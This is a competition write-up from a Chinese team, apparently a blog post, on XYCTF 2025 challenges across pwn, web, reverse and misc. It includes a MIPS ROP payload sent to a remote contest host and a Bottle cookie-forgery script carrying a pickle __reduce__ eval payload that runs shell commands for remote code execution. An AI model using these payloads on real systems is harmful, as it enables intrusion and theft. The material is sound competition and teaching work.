26720)\n#a=process(\"./ez\")\n\nr = lambda a : io.recv(a)\nrl = lambda    a=False        : io.recvline(a)\nru = lambda a,b=True    : io.recvuntil(a,b)\ns = lambda x            : io.send(x)\nsl = lambda x            : io.sendline(x)\nsa = lambda a,b            : io.sendafter(a,b)\nsla = lambda a,b        : io.sendlineafter(a,b)\nshell = lambda            : io.interactive()\ndef debug(script=\"\"):\n\tgdb.attach(a, gdbscript=script,arch=\"mips\")\n\ncat=0x0411010\ngadget=0x00400a20\n\n#p=\"A\"*(32+4*1)+p32(0x004009c8)\np=\"A\"*(32+4)+p32(gadget)+p32(cat)+p32(0x400b70)+p32(cat)\n#pause()\n\nsa(\">\", p)\n\nshell()\n```\n\n## Misc\n\n### 签个到吧\n\n```bash\nn```\n\nBrainFuck，但是观察到没有 `.` 来输出，在每部分后加上即可\n\n```vbnet\nn```\n\nflag{W3lC0me_t0_XYCTF_2025_Enj07_1t!}\n\n### 曼波曼波曼波\n\nsmn.txt的base64逆序，后发现jpg文件头，保存为文件\n\n![](/images/download-1744626745339-68.jpg)\t\t\t\t\t\t\t\t\t\t\t\t\t\t\n\n010查看发现后面跟了PK，binwalk分解得到压缩包\n\n提示说，密码是什么来着，有点记不清了，呜呜呜呜 好像是什么比赛名字加年份\n\n还以为有什么其他的，掩码爆破了一下发现密码确实是XYCTF2025\n\n给了两张一样的图片，双图盲水印秒了\n\n![](/images/EASY_1_decpy3-1744626745339-69.png)\n\n\n\n### MADer也要当CTFer\n\n提取mkv文件的字幕轨subs.ass\n\n发现是一堆hex提取出一个RIFX开头的文件，发现是一个aep文件\n\n使用ae打开，发现有图层\n\n![](/images/1743836629066-03a76683-7499-468d-85f3-3fb10439a989-1744626745339-70.png)\n\n取消设置隐藏\"消隐\"的图层，可以看到有一写文字，flag在flag2这个文本中，需要调一下缩放就可以复制其中的内容了。\n\n![](/images/1743836639502-b7bffbac-436b-46f2-befe-b8721af93a21-1744626745339-72.png)\n\nflag{l_re@IIy_w@nn@_2_Ie@rn_AE}\n\n### 会飞的雷克萨斯\n\n看图猜到是之前小孩炸车事件，直接百度该事件。\n\n![](/images/QQ_1743832187198-1744626745339-71.png)\n\n得到地址：四川省内江市资中县春岚北路\n\n后面XXXXXX内通过地图看应该是中铁城市中心\n\n![](/images/QQ_1743832241003-1744626745339-73.png)\n\nflag{四川省内江市资中县春岚北路中铁城市中心内}\n\n### XGCTF\n\n搜索关键词找到题目名称：**easy_polluted**\n\n![](/images/QQ_1743832317067-1744626745339-74.png)\n\n![](/images/1743832324744-64f7289f-3287-4b94-996f-1b63731e7717-1744626745335-1.png)\n\ngithub可以搜到dragonkeep\n\n通过访问他的.github.io会重定位到\n\n![](/images/QQ_1743832409731-1744626745339-76.png)\n\n找到第一篇文章。\n\n![](/images/QQ_1743832453654-1744626745339-75.png)\n\nf12找到flag进行base64解密。\n\n![](/images/QQ_1743832482740-1744626745339-77.png)flag{1t_I3_t3E_s@Me_ChAl1eNge_aT_a1L_P1e@se_fOrg1ve_Me}\n\n### Greedymen\n\n将题目和思路发给claude写出计算优解代码\n\n思路：先拿最大质数；从其他质数相关的大合数开始取；给对面拿最少分数前提取剩下的数字\n\n算法代码：\n\n```cpp\n#include <iostream>\n#include <vector>\n#include <set>\n#include <algorithm>\n#include <map>\n\nusing namespace std;\n\nvector<int> getFactors(int n)\n{\n    vector<int> factors;\n    for (int i = 1; i <= n; i++)\n    {\n        if (n % i == 0)\n            factors.push_back(i);\n    }\n    return factors;\n}\n\nbool isPrime(int n)\n{\n    if (n < 2)\n        return false;\n    for (int i = 2; i * i <= n; i++)\n    {\n        if (n % i == 0)\n            return false;\n    }\n    return true;\n}\n\nstruct Evaluation\n{\n    int immediateGain;\n    int futureImpact;\n    int numFactors;\n\n    bool operator<(const Evaluation &other) const\n    {\n        if (immediateGain != other.immediateGain)\n            return immediateGain < other.immediateGain;\n        if (futureImpact != other.futureImpact)\n            return futureImpact < other.futureImpact;\n        return numFactors > other.numFactors;\n    }\n};\n\nconst int NEG_INF = -1000000000; // 使用整数常量\n\nEvaluation evaluateChoice(int num, const set<int> &usedNumbers, int maxNum)\n{\n    vector<int> factors = getFactors(num);\n    int opponentGain = 0;\n    set<int> newUsed = usedNumbers;\n    newUsed.insert(num);\n\n    for (int factor : factors)\n    {\n        if (factor != num && usedNumbers.find(factor) == usedNumbers.end())\n        {\n            opponentGain += factor;\n        }\n    }\n\n    int futureOptions = 0;\n    for (int i = maxNum; i >= 2; i--)\n    {\n        if (newUsed.find(i) == newUsed.end())\n        {\n            vector<int> iFactors = getFactors(i);\n            bool hasUnusedFactor = false;\n            for (int f : iFactors)\n            {\n                if (f != i && newUsed.find(f) == newUsed.end())\n                {\n                    hasUnusedFactor = true;\n                    break;\n                }\n            }\n            if (hasUnusedFactor)\n                futureOptions++;\n        }\n    }\n\n    return {num - opponentGain, futureOptions, (int)factors.size()};\n}\n\nvoid solveLevel(int maxNum, int moves)\n{\n    set<int> used;\n    vector<int> choices;\n    int myScore = 0;\n    int opponentScore = 0;\n    map<int, vector<int>> factorMap;\n\n    // 预计算所有数的因数\n    for (int i = 1; i <= maxNum; i++)\n    {\n        factorMap[i] = getFactors(i);\n    }\n\n    while (moves > 0)\n    {\n        int bestNum = -1;\n        Evaluation bestEval = {NEG_INF, NEG_INF, 1000}; // 使用整数常量\n\n        for (int i = maxNum; i >= 2; i--)\n        {\n            if (used.find(i) != used.end())\n                continue;\n\n            bool hasUnusedFactor = false;\n            for (int factor : factorMap[i])\n            {\n                if (factor != i && used.find(factor) == used.end())\n                {\n                    hasUnusedFactor = true;\n                    break;\n                }\n            }\n\n            if (!hasUnusedFactor)\n                continue;\n\n            Evaluation eval = evaluateChoice(i, used, maxNum);\n            if (bestEval < eval)\n            {\n                bestEval = eval;\n                bestNum = i;\n            }\n        }\n\n        if (bestNum == -1)\n            break;\n\n        choices.push_back(bestNum);\n        myScore += bestNum;\n        used.insert(bestNum);\n\n        for (int factor : factorMap[bestNum])\n        {\n            if (factor != bestNum && used.find(factor) == used.end())\n            {\n                opponentScore += factor;\n                used.insert(factor);\n            }\n        }\n\n        moves--;\n    }\n\n    // 计算剩余数字\n    for (int i = 1; i <= maxNum; i++)\n    {\n        if (used.find(i) == used.end())\n        {\n            opponentScore += i;\n        }\n    }\n\n    cout << \"Level \" << maxNum << \" (\" << moves << \" moves):\\n\";\n    cout << \"choices = [\";\n    for (size_t i = 0; i < choices.size(); i++)\n    {\n        cout << choices[i];\n        if (i < choices.size() - 1)\n            cout << \", \";\n    }\n    cout << \"]\\n\";\n\n    cout << \"My Score: \" << myScore << \"\\n\";\n    cout << \"Opponent Score: \" << opponentScore << \"\\n\";\n    cout << \"Score Difference: \" << myScore - opponentScore << \"\\n\\n\";\n}\n\nint main()\n{\n    solveLevel(50, 19);  // Level 1\n    solveLevel(100, 37); // Level 2\n    solveLevel(200, 76); // Level 3\n    return 0;\n}\n```\n\n输出：\n\n```cpp\nLevel 50 (0 moves):\nchoices = [47, 49, 35, 39, 26, 46, 33, 45, 38, 44, 34, 50, 30, 28, 42, 40, 32, 24, 36]\nMy Score: 718\nOpponent Score: 557\nScore Difference: 161\n\nLevel 100 (0 moves):\nchoices = [97, 95, 91, 85, 77, 93, 62, 87, 99, 81, 94, 69, 86, 92, 63, 82, 76, 66, 74, 88, 54, 98, 75, 50, 100, 70, 68, 56, 84, 60, 90, 52, 78, 80, 64, 48, 72]\nMy Score: 2856\nOpponent Score: 2194\nScore Difference: 662\n\nLevel 200 (0 moves):\nchoices = [199, 187, 169, 185, 161, 155, 183, 122, 177, 145, 175, 133, 159, 171, 153, 194, 141, 188, 178, 129, 172, 166, 123, 164, 158, 117, 195, 130, 105, 189, 147, 135, 98, 196, 182, 165, 110, 154, 148, 146, 78, 156, 104, 114, 190, 152, 142, 102, 170, 136, 134, 126, 124, 186, 90, 180, 140, 116, 174, 120, 80, 160, 128, 112, 168, 108, 162, 100, 150, 96, 144, 92, 138, 88, 132, 198]\nMy Score: 11094\nOpponent Score: 9006\nScore Difference: 2088\n```\n\n```python\nfrom pwn import *\n\n\ncontext.log_level = 'debug'\nsh=remote(\"47.94.204.178\",26629 )\n\nsh.recvuntil(b'3.Quit\\n')\nsh.sendline(b'1')\n\n# 这边打的时候Level1使用的是之前手动取的值\nnums=[[47, 49, 21, 39, 27, 33, 44, 40, 42, 45, 46, 48, 50, 38, 36, 34],\n      [97, 95, 91, 85, 77, 93, 62, 87, 99, 81, 94, 69, 86, 92, 63, 82, 76, 66, 74, 88, 54, 98, 75, 50, 100, 70, 68, 56, 84, 60, 90, 52, 78, 80, 64, 96, 72],\n      [199, 187, 169, 185, 161, 155, 183, 122, 177, 145, 175, 133, 159, 171, 153, 194, 141, 188, 178, 129, 172, 166, 123, 164, 158, 117, 195, 130, 105, 189, 147, 135, 98, 196, 182, 165, 110, 154, 148, 146, 78, 156, 104, 114, 190, 152, 142, 102, 170, 136, 134, 126, 124, 186, 90, 180, 140, 116, 174, 120, 80, 160, 128, 112, 168, 108, 162, 100, 150, 96, 144, 92, 138, 88, 132, 198]]\nfor num in nums:\n    sh.recvuntil(b'ers\\n')\n    for i in num:\n        sh.recvuntil(b'ber:')\n        sh.sendline(str(i).encode())\n\nsh.recvlines()\nsh.interactive()\n```\n\nb\"Congratulations!, Here's Your Flag flag{Greed, is......key of the life.}\\n\"\n\n","source":"_posts/XYCTF25-不知道-WP.md","raw":"---\ntitle: XYCTF25 不知道 WP\ndate: 2025-04-07 20:00:45\ntags: [cry,web,re,pwn,misc]\ncategories: wp\ntypora-root-url: ./..\n---\n\n# 战队名：不知道\n\n**排名**：**1**\n\n![](/images/e859cd5cae823fc6e9ecd736647c7dab-1744626745337-9.png)\n\n## Web\n\n### ez_puzzle\n\n查看js源码，找到_3KH_函数判断输出flag的地方\n\n```python\nif (G > yw4) {\n      alert(O[s74](J74))\n    } else {\n      alert($vfeRha_calc(S74 + G / Rw4, Y74, $v5sNVR(vS4)))\n    }\n```\n\n运行到此处即可\n\n![](/images/image-1744626745337-3.png)\n\n### SignIn\n\n访问/secret 获得cookie \n\n疑似Bottle 框架的 signed cookie\n\nsigned cookie 构造\n\n`!4SSvdzbD0UYv84Lnpmm1VLtPBddCrvhgQOLkNQbhjek=`是 base 64 编码的   HMAC - SHA 1 签名\n\n`gAWVGQAAAAAAAABdlCiMBG5hbWWUfZRoAYwFZ3Vlc3SUc2Uu`是 base64 编码的 Python 数据，反序列化后应该是\n\n也就是说第二端可以通过pickle 序列化攻击实现 rce\n\n```python\nfrom bottle import SimpleCookie\nimport base64\nimport hmac\nimport hashlib\nimport pickle\n\ndef make_signed_cookie(secret, data):\n    pickled = pickle.dumps(data)\n    digest = hmac.new(secret.encode(), pickled, hashlib.sha1).digest()\n    cookie = '!' + base64.b64encode(digest).decode() + '?' + base64.b64encode(pickled).decode()\n    return cookie\n\n# 假设你已经拿到 secret 内容：\nsecret = \"\"  # ← 替换成实际值\ndata = {\"name\": \"admin\"}\nsigned_cookie = make_signed_cookie(secret, data)\nprint(\"伪造的 Cookie 值：\", signed_cookie)\n```\n\n通过/download 读取 签名\n\n![](/images/image-20250406194123399-1744626745337-4.png)\n\n```vbnet\nHell0_H@cker_Y0u_A3r_Sm@r7\n```\n\n```python\nfrom bottle import SimpleCookie\nimport base64\nimport hmac\nimport hashlib\nimport pickle\n\ndef make_signed_cookie(secret, data):\n    pickled = pickle.dumps(data)\n    digest = hmac.new(secret.encode(), pickled, hashlib.sha1).digest()\n    cookie = '!' + base64.b64encode(digest).decode() + '?' + base64.b64encode(pickled).decode()\n    return cookie\n\nsecret = \"Hell0_H@cker_Y0u_A3r_Sm@r7\"  \nclass Data(object):\n    def __reduce__(self):\n         \n        return (eval, (\"__import__('os').popen('cat /flag*>/test.txt').read()\",))\ndata = Data()\nencoded = base64.b64encode(pickle.dumps(data, -1))\nprint(encoded)\nsigned_cookie = make_signed_cookie(secret, data)\nprint(\"伪造的 Cookie 值：\", signed_cookie)\n```\n\n伪造cookie成功后再通过download 路由实现任意文件读取\n\n![](/images/image-20250406200423921-1744626745337-5.png)\n\n\n\n\n\n## Reverse\n\n### WARMUP\n\n网上抄的VBS解密代码\n\n```vbscript\nFunction Defuscator(vbs)\n    Dim t\n    t = InStr(1, vbs, \"Execute\", 1)\n    t = Mid(vbs, t + Len(\"Execute\"))\n    t = Eval(t)\n    Defuscator = t\nEnd Function\n\nDim fso, i, outFile\nConst ForReading = 1, ForWriting = 2\nSet fso = CreateObject(\"Scripting.FileSystemObject\")\n\n    ' 创建或打开一个文件用于写入输出\n    Set outFile = fso.OpenTextFile(\"output.txt\", ForWriting, True)\n\n        For i = 0 To WScript.Arguments.Count - 1\n        Dim FileName\n        FileName = WScript.Arguments(i)\n        Dim MyFile\n        Set MyFile = fso.OpenTextFile(FileName, ForReading)\n            Dim vbs\n            vbs = MyFile.ReadAll\n            outFile.WriteLine Defuscator(vbs)\n            MyFile.Close\n        Next\n\n        outFile.Close\n        Set fso = Nothing\n```\n\noutput.txt:\n\n```vbscript\nMsgBox \"Dear CTFER. Have fun in XYCTF 2025!\"\nflag = InputBox(\"Enter the FLAG:\", \"XYCTF\")\nwefbuwiue = \"90df4407ee093d309098d85a42be57a2979f1e51463a31e8d15e2fac4e84ea0df622a55c4ddfb535ef3e51e8b2528b826d5347e165912e99118333151273cc3fa8b2b3b413cf2bdb1e8c9c52865efc095a8dd89b3b3cfbb200bbadbf4a6cd4\" ' 棰勮鐨凴C4鍔犲瘑缁撴灉锛堝崄鍏繘鍒舵牸寮忥級\nqwfe = \"rc4key\"\n\n' 淇鍚庣殑RC4鍔犲瘑鍑芥暟\nFunction RunRC(sMessage, strKey)\n    Dim kLen, i, j, temp, pos, outHex\n    Dim s(255), k(255)\n    \n    ' 鍒濆鍖栧瘑閽?\n    kLen = Len(strKey)\n    For i = 0 To 255\n        s(i) = i\n        k(i) = Asc(Mid(strKey, (i Mod kLen) + 1, 1)) ' 瀵嗛挜浣跨敤ASCII缂栫爜\n    Next\n    \n    ' KSA瀵嗛挜璋冨害\n    j = 0\n    For i = 0 To 255\n        j = (j + s(i) + k(i)) Mod 256\n        temp = s(i)\n        s(i) = s(j)\n        s(j) = temp\n    Next\n    \n    ' PRGA鍔犲瘑娴佺▼\n    i = 0 : j = 0 : outHex = \"\"\n    For pos = 1 To Len(sMessage)\n        i = (i + 1) Mod 256\n        j = (j + s(i)) Mod 256\n        temp = s(i)\n        s(i) = s(j)\n        s(j) = temp\n        \n        ' 鍔犲瘑骞惰浆涓哄崄鍏繘鍒?\n        Dim plainChar, cipherByte\n        plainChar = Asc(Mid(sMessage, pos, 1)) ' 鏄庢枃鎸堿SCII澶勭悊\n        cipherByte = s((s(i) + s(j)) Mod 256) Xor plainChar\n        outHex = outHex & Right(\"0\" & Hex(cipherByte), 2)\n    Next\n    \n    RunRC = outHex\nEnd Function\n\n' 涓婚獙璇侀€昏緫\nIf LCase(RunRC(flag, qwfe)) = LCase(wefbuwiue) Then\n    MsgBox \"Congratulations! Correct FLAG!\"\nElse\n    MsgBox \"Wrong flag.\"\nEnd If\n\n\n\n```\n\nRC4解密，密钥为**rc4key**\n\n![](/images/1-1744626745337-7.png)\n\nflag{We1c0me_t0_XYCTF_2025_reverse_ch@lleng3_by_th3_w@y_p3cd0wn's_chall_is_r3@lly_gr3@t_&_fuN!}\n\n### ezVM\n\n通过字符串界面里的unicorn和加密函数的一些特征发现是使用了unicorn框架调用了一串代码。\n\n找一个使用unicorn框架的程序进行bindiff恢复一些unicorn函数的符号。\n\n发现是调用了一串ARM64的代码字节进行模拟执行，将输入字符串传入加密返回，并附上了一些data和栈空间初始化。\n\n![](/images/2-1744626745337-6.png)\n\n![](/images/4-1744626745337-8.png)\n\n将以上调用write写入的数据提取，随便找一个ARM64框架的.so复制到对应地址，以便反编译看代码。\n\n最后得到一个函数，很清晰的看出里面是一个VM虚拟机执行的流程。\n\n![](/images/5-1744626745337-10.png)\n\n使用c++编写代码调用unicorn库进行模拟。\n\n使用Hook，在关键计算地址处进行Hook，输出各个计算流程以及数据。\n\n```cpp\n#include <iostream>\n#include <Windows.h>\n#include <string>\n#include <vector>\n#include <iostream>\n#include \"data.hpp\"\n#include \"unicorn/unicorn.h\"\n#pragma comment(lib,\"unicorn-import.lib\")\n\nstatic void hook_code(uc_engine* uc, uint64_t address, uint32_t size, void* user_data) {\n    uint64_t w0,w1,w2,w3,w4;\n\n    if (address == 0x1fac) \n    {\n        uc_reg_read(uc, UC_ARM64_REG_W1, &w1);\n        uc_reg_read(uc, UC_ARM64_REG_W0, &w0);\n\n        printf(\"W3 = W1 ^ W0 --- %llx ^ %llx = %llx\\n\", w1,w0,w1^w0);\n    }\n    if (address == 0x2BE4)\n    {\n        uc_reg_read(uc, UC_ARM64_REG_W1, &w1);\n        uc_reg_read(uc, UC_ARM64_REG_W0, &w0);\n\n        printf(\"W3 = W1 >> W0 --- %llx >> %llx = %llx\\n\", w1, w0, w1 >> w0);\n    }\n    if (address == 0x2DB4)\n    {\n        uc_reg_read(uc, UC_ARM64_REG_W1, &w1);\n        uc_reg_read(uc, UC_ARM64_REG_W0, &w0);\n\n        printf(\"W3 = W1 << W0 --- %llx << %llx = %llx\\n\", w1, w0, w1 << w0);\n    }\n    if (address == 0x232C)\n    {\n        uc_reg_read(uc, UC_ARM64_REG_W3, &w3);\n        uc_reg_read(uc, UC_ARM64_REG_W0, &w0);\n\n        printf(\"W2 = W0 & W3 --- %llx & %llx = %llx\\n\", w0, w3, w0 & w3);\n    }\n    if (address == 0x2054)\n    {\n        uc_reg_read(uc, UC_ARM64_REG_W3, &w3);\n        uc_reg_read(uc, UC_ARM64_REG_W0, &w0);\n\n        printf(\"W2 = W0 ^ W3 --- %llx ^ %llx = %llx\\n\", w0, w3, w3 ^ w0);\n    }\n    if (address == 0x2238)\n    {\n        uc_reg_read(uc, UC_ARM64_REG_W3, &w3);\n        uc_reg_read(uc, UC_ARM64_REG_W0, &w0);\n\n        printf(\"W2 = W0 ^ W3 --- %llx ^ %llx = %llx\\n\", w0, w3, w3 ^ w0);\n    }\n    if (address == 0x2180)\n    {\n        uc_reg_read(uc, UC_ARM64_REG_W1, &w1);\n        uc_reg_read(uc, UC_ARM64_REG_W4, &w4);\n\n        printf(\"W1 = W1 ^ W4 --- %llx ^ %llx = %llx\\n\", w1, w4, w1 ^ w4);\n    }\n    if (address == 0x1CC4)\n    {\n        uc_reg_read(uc, UC_ARM64_REG_W0, &w0);\n        uc_reg_read(uc, UC_ARM64_REG_W1, &w1);\n        printf(\"W2 = W1 + W0 --- %llx + %llx = %llx\\n\", w1, w0, w1 + w0);\n    }\n    if (address == 0x1A0C)\n    {\n        uc_reg_read(uc, UC_ARM64_REG_W0, &w0);\n        uc_reg_read(uc, UC_ARM64_REG_W1, &w1);\n        printf(\"W2 = W1 + W0 --- %llx + %llx = %llx\\n\", w1, w0, w1 + w0);\n    }\n}\n\nint main()\n{\n    uint8_t Input[] = \"11112222111111111111111111111111\";\n    uc_engine* uc{};\n    uc_hook hook;\n    uint64_t InputAddr = 0x14C28;\n    uint64_t Stack = 0x7F0000;\n    uint8_t MyEncFlag[100]{};\n    uint64_t Base = 0x0000000001000000;\n    uc_open(uc_arch::UC_ARCH_ARM64, uc_mode::UC_MODE_ARM, &uc);\n    uc_mem_map(uc, 0, Base, UC_PROT_ALL);\n    uc_mem_map(uc, Stack - 4096, 0x4000, UC_PROT_ALL);\n    uc_hook_add(uc, &hook, UC_HOOK_CODE, hook_code, NULL, 1, 0);\n    uc_mem_write(uc, 0x14C28, (LPVOID)&Input, 0x20u);\n    uc_mem_write(uc, 0x0C70, (LPVOID)&Code, 8840u);\n    uc_mem_write(uc, 0x14010, (LPVOID)Data1, 0x9B8u);\n    uc_mem_write(uc, 0x30F0, (LPVOID)&Data2, 0x54u);\n    uc_mem_write(uc, 0x149E8, (LPVOID)&Data3, 8u);\n    uc_reg_write(uc, 0xC7, (LPVOID)&InputAddr);// X0\n    uc_reg_write(uc, 4, (LPVOID)&Stack);       // SP\n    if (!uc_emu_start(uc, 0x0C70, 0x2EF4, 0, 0))\n    {\n        uc_mem_read(uc, InputAddr, &MyEncFlag, 48);\n    }\n    for (int i = 0; i < 32; i++)\n    {\n        printf(\"%X \", MyEncFlag[i]);\n    }\n    uc_close(uc);\n\treturn 0;\n}\n```\n\n最后运行输出得到一个vm加密流程\n\n以下是部分输出内容。\n\noutput:\n\n```cpp\nW3 = W1 << W0 --- 4 << 0 = 4\nW3 = W1 << W0 --- 4 << 1 = 8\nW3 = W1 >> W0 --- 32323232 >> 5 = 1919191\nW3 = W1 << W0 --- 32323232 << 6 = c8c8c8c80\nW3 = W1 ^ W0 --- 1919191 ^ 8c8c8c80 = 8d1d1d11\nW2 = W0 ^ W3 --- 32323232 ^ 11223344 = 23100176\nW2 = W1 + W0 --- 8d1d1d11 + 23100176 = b02d1e87\nW2 = W0 & W3 --- 0 & 3 = 0\nW2 = W1 + W0 --- 776f6853 + 0 = 776f6853\nW2 = W0 ^ W3 --- 776f6853 ^ abab1212 = dcc47a41\nW3 = W1 ^ W0 --- b02d1e87 ^ dcc47a41 = 6ce964c6\nW2 = W1 + W0 --- 6ce964c6 + 31313131 = 9e1a95f7\nW3 = W1 >> W0 --- 9e1a95f7 >> 4 = 9e1a95f\nW3 = W1 << W0 --- 9e1a95f7 << 7 = 4f0d4afb80\nW3 = W1 ^ W0 --- 9e1a95f ^ d4afb80 = 4ab52df\nW2 = W0 ^ W3 --- 9e1a95f7 ^ 55667788 = cb7ce27f\nW2 = W1 + W0 --- 4ab52df + cb7ce27f = d028355e\nW3 = W1 >> W0 --- 5f5fe6e7 >> b = bebfc\nW2 = W0 & W3 --- bebfc & 3 = 0\nW2 = W1 + W0 --- 776f6853 + 5f5fe6e7 = d6cf4f3a\nW2 = W0 ^ W3 --- d6cf4f3a ^ 23235566 = f5ec1a5c\nW3 = W1 ^ W0 --- f5ec1a5c ^ d028355e = 25c42f02\nW2 = W1 + W0 --- 25c42f02 + 32323232 = 57f66134\nW3 = W1 >> W0 --- 57f66134 >> 5 = 2bfb309\nW3 = W1 << W0 --- 57f66134 << 6 = 15fd984d00\nW3 = W1 ^ W0 --- 2bfb309 ^ fd984d00 = ff27fe09\nW2 = W0 ^ W3 --- 57f66134 ^ 11223344 = 46d45270\nW2 = W1 + W0 --- ff27fe09 + 46d45270 = 145fc5079\nW2 = W0 & W3 --- 5f5fe6e7 & 3 = 3\nW2 = W1 + W0 --- 74696564 + 5f5fe6e7 = d3c94c4b\nW2 = W0 ^ W3 --- d3c94c4b ^ abab1212 = 78625e59\nW3 = W1 ^ W0 --- 45fc5079 ^ 78625e59 = 3d9e0e20\nW2 = W1 + W0 --- 3d9e0e20 + 9e1a95f7 = dbb8a417\nW3 = W1 >> W0 --- dbb8a417 >> 4 = dbb8a41\nW3 = W1 << W0 --- dbb8a417 << 7 = 6ddc520b80\nW3 = W1 ^ W0 --- dbb8a41 ^ dc520b80 = d1e981c1\nW2 = W0 ^ W3 --- dbb8a417 ^ 55667788 = 8eded39f\nW2 = W1 + W0 --- d1e981c1 + 8eded39f = 160c85560\nW3 = W1 >> W0 --- bebfcdce >> b = 17d7f9\nW2 = W0 & W3 --- 17d7f9 & 3 = 1\nW2 = W1 + W0 --- 656b616d + bebfcdce = 1242b2f3b\nW2 = W0 ^ W3 --- 242b2f3b ^ 23235566 = 7087a5d\nW3 = W1 ^ W0 --- 7087a5d ^ 60c85560 = 67c02f3d\nW2 = W1 + W0 --- 67c02f3d + 57f66134 = bfb69071\nW3 = W1 >> W0 --- bfb69071 >> 5 = 5fdb483\nW3 = W1 << W0 --- bfb69071 << 6 = 2feda41c40\nW3 = W1 ^ W0 --- 5fdb483 ^ eda41c40 = e859a8c3\nW2 = W0 ^ W3 --- bfb69071 ^ 11223344 = ae94a335\nW2 = W1 + W0 --- e859a8c3 + ae94a335 = 196ee4bf8\nW2 = W0 & W3 --- bebfcdce & 3 = 2\nW2 = W1 + W0 --- 616d5f72 + bebfcdce = 1202d2d40\nW2 = W0 ^ W3 --- 202d2d40 ^ abab1212 = 8b863f52\nW3 = W1 ^ W0 --- 96ee4bf8 ^ 8b863f52 = 1d6874aa\nW2 = W1 + W0 --- 1d6874aa + dbb8a417 = f92118c1\nW3 = W1 >> W0 --- f92118c1 >> 4 = f92118c\nW3 = W1 << W0 --- f92118c1 << 7 = 7c908c6080\nW3 = W1 ^ W0 --- f92118c ^ 908c6080 = 9f1e710c\nW2 = W0 ^ W3 --- f92118c1 ^ 55667788 = ac476f49\nW2 = W1 + W0 --- 9f1e710c + ac476f49 = 14b65e055\nW3 = W1 >> W0 --- 1e1fb4b5 >> b = 3c3f6\nW2 = W0 & W3 --- 3c3f6 & 3 = 2\nW2 = W1 + W0 --- 616d5f72 + 1e1fb4b5 = 7f8d1427\nW2 = W0 ^ W3 --- 7f8d1427 ^ 23235566 = 5cae4141\nW3 = W1 ^ W0 --- 5cae4141 ^ 4b65e055 = 17cba114\nW2 = W1 + W0 --- 17cba114 + bfb69071 = d7823185\nW3 = W1 >> W0 --- d7823185 >> 5 = 6bc118c\nW3 = W1 << W0 --- d7823185 << 6 = 35e08c6140\nW3 = W1 ^ W0 --- 6bc118c ^ e08c6140 = e63070cc\nW2 = W0 ^ W3 --- d7823185 ^ 11223344 = c6a002c1\nW2 = W1 + W0 --- e63070cc + c6a002c1 = 1acd0738d\nW2 = W0 & W3 --- 1e1fb4b5 & 3 = 1\nW2 = W1 + W0 --- 656b616d + 1e1fb4b5 = 838b1622\nW2 = W0 ^ W3 --- 838b1622 ^ abab1212 = 28200430\nW3 = W1 ^ W0 --- acd0738d ^ 28200430 = 84f077bd\nW2 = W1 + W0 --- 84f077bd + f92118c1 = 17e11907e\nW3 = W1 >> W0 --- 7e11907e >> 4 = 7e11907\nW3 = W1 << W0 --- 7e11907e << 7 = 3f08c83f00\nW3 = W1 ^ W0 --- 7e11907 ^ 8c83f00 = f292607\nW2 = W0 ^ W3 --- 7e11907e ^ 55667788 = 2b77e7f6\nW2 = W1 + W0 --- f292607 + 2b77e7f6 = 3aa10dfd\nW3 = W1 >> W0 --- 7d7f9b9c >> b = faff3\nW2 = W0 & W3 --- faff3 & 3 = 3\nW2 = W1 + W0 --- 74696564 + 7d7f9b9c = f1e90100\nW2 = W0 ^ W3 --- f1e90100 ^ 23235566 = d2ca5466\nW3 = W1 ^ W0 --- d2ca5466 ^ 3aa10dfd = e86b599b\nW2 = W1 + W0 --- e86b599b + d7823185 = 1bfed8b20\nW3 = W1 >> W0 --- bfed8b20 >> 5 = 5ff6c59\nW3 = W1 << W0 --- bfed8b20 << 6 = 2ffb62c800\nW3 = W1 ^ W0 --- 5ff6c59 ^ fb62c800 = fe9da459\nW2 = W0 ^ W3 --- bfed8b20 ^ 11223344 = aecfb864\nW2 = W1 + W0 --- fe9da459 + aecfb864 = 1ad6d5cbd\nW2 = W0 & W3 --- 7d7f9b9c & 3 = 0\nW2 = W1 + W0 --- 776f6853 + 7d7f9b9c = f4ef03ef\nW2 = W0 ^ W3 --- f4ef03ef ^ abab1212 = 5f4411fd\nW3 = W1 ^ W0 --- ad6d5cbd ^ 5f4411fd = f2294d40\nW2 = W1 + W0 --- f2294d40 + 7e11907e = 1703addbe\nW3 = W1 >> W0 --- 703addbe >> 4 = 703addb\nW3 = W1 << W0 --- 703addbe << 7 = 381d6edf00\nW3 = W1 ^ W0 --- 703addb ^ 1d6edf00 = 1a6d72db\nW2 = W0 ^ W3 --- 703addbe ^ 55667788 = 255caa36\nW2 = W1 + W0 --- 1a6d72db + 255caa36 = 3fca1d11\nW3 = W1 >> W0 --- dcdf8283 >> b = 1b9bf0\nW2 = W0 & W3 --- 1b9bf0 & 3 = 0\nW2 = W1 + W0 --- 776f6853 + dcdf8283 = 1544eead6\nW2 = W0 ^ W3 --- 544eead6 ^ 23235566 = 776dbfb0\nW3 = W1 ^ W0 --- 776dbfb0 ^ 3fca1d11 = 48a7a2a1\nW2 = W1 + W0 --- 48a7a2a1 + bfed8b20 = 108952dc1\nW3 = W1 >> W0 --- 8952dc1 >> 5 = 44a96e\nW3 = W1 << W0 --- 8952dc1 << 6 = 2254b7040\nW3 = W1 ^ W0 --- 44a96e ^ 254b7040 = 250fd92e\nW2 = W0 ^ W3 --- 8952dc1 ^ 11223344 = 19b71e85\nW2 = W1 + W0 --- 250fd92e + 19b71e85 = 3ec6f7b3\nW2 = W0 & W3 --- dcdf8283 & 3 = 3\nW2 = W1 + W0 --- 74696564 + dcdf8283 = 15148e7e7\nW2 = W0 ^ W3 --- 5148e7e7 ^ abab1212 = fae3f5f5\nW3 = W1 ^ W0 --- 3ec6f7b3 ^ fae3f5f5 = c4250246\nW2 = W1 + W0 --- c4250246 + 703addbe = 1345fe004\nW3 = W1 >> W0 --- 345fe004 >> 4 = 345fe00\nW3 = W1 << W0 --- 345fe004 << 7 = 1a2ff00200\nW3 = W1 ^ W0 --- 345fe00 ^ 2ff00200 = 2cb5fc00\nW2 = W0 ^ W3 --- 345fe004 ^ 55667788 = 6139978c\nW2 = W1 + W0 --- 2cb5fc00 + 6139978c = 8def938c\nW3 = W1 >> W0 --- 3c3f696a >> b = 787ed\nW2 = W0 & W3 --- 787ed & 3 = 1\nW2 = W1 + W0 --- 656b616d + 3c3f696a = a1aacad7\nW2 = W0 ^ W3 --- a1aacad7 ^ 23235566 = 82899fb1\nW3 = W1 ^ W0 --- 82899fb1 ^ 8def938c = f660c3d\nW2 = W1 + W0 --- f660c3d + 8952dc1 = 17fb39fe\nW3 = W1 >> W0 --- 17fb39fe >> 5 = bfd9cf\nW3 = W1 << W0 --- 